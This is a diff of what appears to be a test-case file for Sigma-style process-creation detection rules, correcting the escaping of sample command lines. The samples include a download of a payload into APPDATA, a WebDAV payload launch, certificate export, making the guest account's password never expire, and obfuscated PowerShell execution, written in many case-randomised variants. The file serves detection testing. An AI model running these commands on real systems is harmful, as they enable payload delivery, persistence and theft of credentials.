-    "target_commandline": "powershell.exe -COMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -COMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -10073,7 +10073,7 @@
   },
   {
     "test_id": "t1098_008",
-    "target_commandline": "powershell.exe -\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -10081,7 +10081,7 @@
   },
   {
     "test_id": "t1098_009",
-    "target_commandline": "powershell.exe /\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -10089,7 +10089,7 @@
   },
   {
     "test_id": "t1098_010",
-    "target_commandline": "powershell.exe -c \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -c \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -10097,7 +10097,7 @@
   },
   {
     "test_id": "t1098_011",
-    "target_commandline": "powershell.exe -cOMMANd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -cOMMANd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -10105,7 +10105,7 @@
   },
   {
     "test_id": "t1098_012",
-    "target_commandline": "powershell.exe -comMand \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -comMand \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -10377,7 +10377,7 @@
   },
   {
     "test_id": "t1104_032",
-    "target_commandline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \"$env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\"$env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1104",
     "shell": "cmd.exe",
@@ -10385,7 +10385,7 @@
   },
   {
     "test_id": "t1104_033",
-    "target_commandline": "powershell.exe -ComMAnd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -ComMAnd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1104",
     "shell": "cmd.exe",
@@ -10393,7 +10393,7 @@
   },
   {
     "test_id": "t1104_034",
-    "target_commandline": "powershell.exe -COMmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COMmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1104",
     "shell": "cmd.exe",
@@ -10401,7 +10401,7 @@
   },
   {
     "test_id": "t1104_035",
-    "target_commandline": "powershell.exe /\"Command\" \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1104",
     "shell": "cmd.exe",
@@ -10409,7 +10409,7 @@
   },
   {
     "test_id": "t1104_036",
-    "target_commandline": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1104",
     "shell": "cmd.exe",
@@ -10417,7 +10417,7 @@
   },
   {
     "test_id": "t1104_037",
-    "target_commandline": "powershell.exe -COmmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COmmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1104",
     "shell": "cmd.exe",
@@ -10425,7 +10425,7 @@
   },
   {
     "test_id": "t1104_038",
-    "target_commandline": "powershell.exe -COMmAND \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COMmAND \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1104",
     "shell": "cmd.exe",
@@ -10665,7 +10665,7 @@
   },
   {
     "test_id": "t1112_003",
-    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1112",
     "shell": "cmd.exe",
@@ -10673,7 +10673,7 @@
   },
   {
     "test_id": "t1112_004",
-    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1112",
     "shell": "cmd.exe",
@@ -10681,7 +10681,7 @@
   },
   {
     "test_id": "t1112_005",
-    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1112",
     "shell": "cmd.exe",
@@ -10689,7 +10689,7 @@
   },
   {
     "test_id": "t1112_006",
-    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1112",
     "shell": "cmd.exe",
@@ -10697,7 +10697,7 @@
   },
   {
     "test_id": "t1112_007",
-    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1112",
     "shell": "cmd.exe",
@@ -10705,7 +10705,7 @@
   },
   {
     "test_id": "t1112_008",
-    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1112",
     "shell": "cmd.exe",
@@ -10745,7 +10745,7 @@
   },
   {
     "test_id": "t1114_007",
-    "target_commandline": "powershell.exe -\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\"",
+    "target_commandline": "powershell.exe -\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\\\"",
     "target_rule": "proc_creation_win_powershell_base64_frombase64string",
     "technique_id": "t1114",
     "shell": "cmd.exe",
@@ -10753,7 +10753,7 @@
   },
   {
     "test_id": "t1114_008",
-    "target_commandline": "powershell.exe /\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\"",
+    "target_commandline": "powershell.exe /\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\\\"",
     "target_rule": "proc_creation_win_powershell_base64_frombase64string",
     "technique_id": "t1114",
     "shell": "cmd.exe",
@@ -10833,7 +10833,7 @@
   },
   {
     "test_id": "t1114_018",
-    "target_commandline": "cmd.exe /v:on /c \"set root=DavWWWRoot&& \\192.168.1.10@80\\!root!\\payload.bat\"",
+    "target_commandline": "cmd.exe /v:on /c \"set root=DavWWWRoot&& \\\\192.168.1.10@80\\!root!\\payload.bat\"",
     "target_rule": "proc_creation_win_webdav_lnk_execution",
     "technique_id": "t1114",
     "shell": "cmd.exe",
@@ -11681,7 +11681,7 @@
   },
   {
     "test_id": "t1220_001",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1220",
     "shell": "cmd.exe",
@@ -11689,7 +11689,7 @@
   },
   {
     "test_id": "t1220_002",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1220",
     "shell": "cmd.exe",
@@ -11697,7 +11697,7 @@
   },
   {
     "test_id": "t1220_003",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1220",
     "shell": "cmd.exe",
@@ -11705,7 +11705,7 @@
   },
   {
     "test_id": "t1220_004",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1220",
     "shell": "cmd.exe",
@@ -11713,7 +11713,7 @@
   },
   {
     "test_id": "t1220_005",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1220",
     "shell": "cmd.exe",
@@ -12113,7 +12113,7 @@
   },
   {
     "test_id": "t1552.004_005",
-    "target_commandline": "powershell.exe /\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\temp\\cert.pfx\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\\\temp\\\\cert.pfx\\\"",
     "target_rule": "proc_creation_win_powershell_export_certificate",
     "technique_id": "t1552.004",
     "shell": "cmd.exe",
@@ -12121,7 +12121,7 @@
   },
   {
     "test_id": "t1552.004_006",
-    "target_commandline": "powershell.exe -\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\temp\\cert.pfx\"",
+    "target_commandline": "powershell.exe -\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\\\temp\\\\cert.pfx\\\"",
     "target_rule": "proc_creation_win_powershell_export_certificate",
     "technique_id": "t1552.004",
     "shell": "cmd.exe",
@@ -12609,7 +12609,7 @@
   },
   {
     "test_id": "t1087_111",
-    "target_commandline": "powershell.exe -COMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -COMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -12617,7 +12617,7 @@
   },
   {
     "test_id": "t1087_112",
-    "target_commandline": "powershell.exe /\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -12641,7 +12641,7 @@
   },
   {
     "test_id": "t1087_115",
-    "target_commandline": "powershell.exe -c \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -c \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -12649,7 +12649,7 @@
   },
   {
     "test_id": "t1087_116",
-    "target_commandline": "powershell.exe -comMand \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -comMand \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1087",
     "shell": "cmd.exe",
@@ -13089,7 +13089,7 @@
   },
   {
     "test_id": "t1047_050",
-    "target_commandline": "powershell.exe -Command \"Get-WmiObject -Class Win32_UserAccount -Filter \"Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -Command \"Get-WmiObject -Class Win32_UserAccount -Filter \\\"Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -13097,7 +13097,7 @@
   },
   {
     "test_id": "t1047_051",
-    "target_commandline": "powershell.exe -coMmAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -coMmAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -13105,7 +13105,7 @@
   },
   {
     "test_id": "t1047_052",
-    "target_commandline": "powershell.exe -coMmAND \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -coMmAND \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -13113,7 +13113,7 @@
   },
   {
     "test_id": "t1047_053",
-    "target_commandline": "powershell.exe -cOMMand \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -cOMMand \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -13121,7 +13121,7 @@
   },
   {
     "test_id": "t1047_054",
-    "target_commandline": "powershell.exe -coMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -coMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -13129,7 +13129,7 @@
   },
   {
     "test_id": "t1047_055",
-    "target_commandline": "powershell.exe -COMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -COMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -13137,7 +13137,7 @@
   },
   {
     "test_id": "t1047_056",
-    "target_commandline": "powershell.exe -\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -13145,7 +13145,7 @@
   },
   {
     "test_id": "t1047_057",
-    "target_commandline": "powershell.exe /\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -13153,7 +13153,7 @@
   },
   {
     "test_id": "t1047_058",
-    "target_commandline": "powershell.exe -c \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -c \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -13161,7 +13161,7 @@
   },
   {
     "test_id": "t1047_059",
-    "target_commandline": "powershell.exe -cOMMANd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -cOMMANd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -13169,7 +13169,7 @@
   },
   {
     "test_id": "t1047_060",
-    "target_commandline": "powershell.exe -comMand \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -comMand \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -13561,7 +13561,7 @@
   },
   {
     "test_id": "t1098_018",
-    "target_commandline": "powershell.exe -Command \"Get-WmiObject -Class Win32_UserAccount -Filter \"Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -Command \"Get-WmiObject -Class Win32_UserAccount -Filter \\\"Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -13569,7 +13569,7 @@
   },
   {
     "test_id": "t1098_019",
-    "target_commandline": "powershell.exe -coMmAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -coMmAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -13577,7 +13577,7 @@
   },
   {
     "test_id": "t1098_020",
-    "target_commandline": "powershell.exe -coMmAND \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -coMmAND \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -13585,7 +13585,7 @@
   },
   {
     "test_id": "t1098_021",
-    "target_commandline": "powershell.exe -cOMMand \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -cOMMand \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -13593,7 +13593,7 @@
   },
   {
     "test_id": "t1098_022",
-    "target_commandline": "powershell.exe -coMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -coMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -13601,7 +13601,7 @@
   },
   {
     "test_id": "t1098_023",
-    "target_commandline": "powershell.exe -\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -\"Command\" \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance /\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -13609,7 +13609,7 @@
   },
   {
     "test_id": "t1098_024",
-    "target_commandline": "powershell.exe -cOMMANd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -cOMMANd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -14593,7 +14593,7 @@
   },
   {
     "test_id": "t1012_014",
-    "target_commandline": "cmd /c \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \" iex([System.Windows.Forms.Clipboard]::GetText())\"\"",
+    "target_commandline": "cmd /c \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \\\" iex([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_clip",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -14601,7 +14601,7 @@
   },
   {
     "test_id": "t1012_015",
-    "target_commandline": "cmd /C \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \" iex([System.Windows.Forms.Clipboard]::GetText())\"\"",
+    "target_commandline": "cmd /C \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \\\" iex([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_clip",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -14625,7 +14625,7 @@
   },
   {
     "test_id": "t1012_018",
-    "target_commandline": "cmd /r \"echo Write-Host 'Bypass' | clip && powershell.exe -nop -c \" $c='cl'+'ipboard]::'; iex([System.Windows.Forms.Clipboard]::GetText())\"\"",
+    "target_commandline": "cmd /r \"echo Write-Host 'Bypass' | clip && powershell.exe -nop -c \\\" $c='cl'+'ipboard]::'; iex([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_clip",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -14809,7 +14809,7 @@
   },
   {
     "test_id": "t1012_041",
-    "target_commandline": "cmd.exe /c \"set PAYLOAD=Write-Host 'Benign Educational Bypass' & set LAUNCH=powershell.exe -NoP -c \"{1}{0}\" -f 'st','Te' & %LAUNCH%\"",
+    "target_commandline": "cmd.exe /c \"set PAYLOAD=Write-Host 'Benign Educational Bypass' & set LAUNCH=powershell.exe -NoP -c \\\"{1}{0}\\\" -f 'st','Te' & %LAUNCH%\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_via_var",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -14977,7 +14977,7 @@
   },
   {
     "test_id": "t1012_062",
-    "target_commandline": "powershell.exe -Command \"[Reflection.Assembly]::(\"{1}{0}\" -f 'oad','L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -Command \"[Reflection.Assembly]::(\\\"{1}{0}\\\" -f 'oad','L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -14985,7 +14985,7 @@
   },
   {
     "test_id": "t1012_063",
-    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
